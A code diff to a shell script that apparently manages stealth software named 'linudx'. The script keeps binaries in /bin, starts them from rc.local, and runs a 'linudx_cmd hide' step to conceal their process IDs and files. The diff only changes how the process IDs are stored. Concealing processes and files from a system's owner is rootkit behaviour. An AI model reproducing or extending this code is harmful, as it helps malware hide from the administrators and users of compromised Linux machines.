@@ -34,9 +34,7 @@ fi
 #uninstall start
 sed -i '\/bin\/linudx-startup.sh/d' /etc/rc.d/rc.local
 
-kill -9 `cat /bin/linudxd-pid`
-kill -9 `cat /bin/linudxt-pid`
-kill -9 `cat /bin/linudx-home-pid`
+kill -9 `cat /bin/linudx-pids`
 
 rm -rf /bin/linudxd
 rm -rf /bin/linudxt
@@ -76,9 +74,7 @@ p1=`pidof linudxd`
 p2=`pidof linudxt`
 p3=`pidof linudx-home`
 
-echo "$p1">/bin/linudxd.pid
-echo "$p2">/bin/linudxt.pid
-echo "$p3">/bin/linudx-home.pid
+
 
 #hide pid and files
 /linudx/linudx_cmd hide $p1
@@ -96,3 +92,5 @@ if [ "`pidof linudxd`" ];then
 else
   echo "hide sucess two" 
 fi
+
+echo "$p1 $p2 $p3" > /bin/linudx-pids
